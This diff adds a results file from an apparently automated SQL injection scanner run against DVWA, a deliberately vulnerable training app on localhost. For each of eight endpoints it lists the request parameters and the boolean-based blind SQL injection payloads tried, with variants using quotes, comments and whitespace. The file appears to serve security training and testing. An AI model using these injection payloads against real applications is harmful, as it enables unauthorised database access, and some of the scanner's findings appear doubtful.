@@ -1,0 +1,90 @@
+Target: http://localhost/dvwa/ (GET)
+
+---
+URL:http://localhost/dvwa/vulnerabilities/exec/ (POST)
+VulnName: 
+Query: {'ip': 'cntvalue', 'Submit': 'Submit', 'user_token': '39beb733ef6569063c2b7e65015c7955'}
+Payload: "+and+"91292"="91292
+"+and+"63623"="63623
+"+or+45978=45978#
+"+and+"90104"="90105
+Advice: 
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli/ (GET)
+VulnName: blind sqli
+Query: {'user_token': '92ed41088ef110b00e93ce3b7a30aea2', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: '+and+'47189'='47189
+'+and+'83866'='83866
+'+or+66299=66299#
+'+and+'6541'='6542
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/captcha/ (POST)
+VulnName: blind sqli
+Query: {'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'recaptcha_response_field': 'manual_challenge', 'recaptcha_challenge_field': '', 'password_new': 'cntvalue', 'user_token': '101c332ddd5775c60e96b0c08dc533e1', 'step': '1', 'Change': 'Change'}
+Payload: '+and+'47189'='47189
+'+and+'83866'='83866
+'+or+66299=66299#
+'+and+'6541'='6542
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/setup.php (POST)
+VulnName: 
+Query: {'user_token': '045dfa507aaf7b022baa3518f2eb6e20', 'create_db': 'Create / Reset Database'}
+Payload: "/**/and/**/"83847"="83847
+"/**/and/**/"47620"="47620
+"/**/or/**/73424=73424#
+"/**/and/**/"41646"="41647
+Advice: 
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/xss_s/ (POST)
+VulnName: 
+Query: {'user_token': 'becf7079043f505dda7ab526a330565a', 'btnSign': 'Sign Guestbook', 'mtxMessage': '', 'txtName': 'cntvalue'}
+Payload: +and+35922=35922
++and+25692=25692
++or+40523=40523#
++and+67339=67340
+Advice: 
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/csrf/ (GET)
+VulnName: blind sqli
+Query: {'password_new': 'cntvalue', 'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'Change': 'Change', 'user_token': 'd0e21a33f386621781f2bdfa2ad40990'}
+Payload: '	and	'68074'='68074
+'	and	'35888'='35888
+'	or	83400=83400#
+'	and	'21543'='21544
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli_blind/ (GET)
+VulnName: blind sqli
+Query: {'user_token': '0d71bbdbe5faa9d246002acf17f9241b', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: '	and	'68074'='68074
+'	and	'35888'='35888
+'	or	83400=83400#
+'	and	'21543'='21544
+Advice: use orm
+Database: unknown
+---
+---
+URL:http://localhost/dvwa/vulnerabilities/brute/ (POST)
+VulnName: blind sqli
+Query: {'username': 'cntvalue', 'user_token': 'ade5a1e4644e8e23897c3b82d1d8a8df', 'Login': 'Login', 'password': 'cntvalue'}
+Payload: "	and	"85168"="85168
+"	and	"18294"="18294
+"	or	35358=35358#
+"	and	"17610"="17611
+Advice: use orm
+Database: unknown
+---
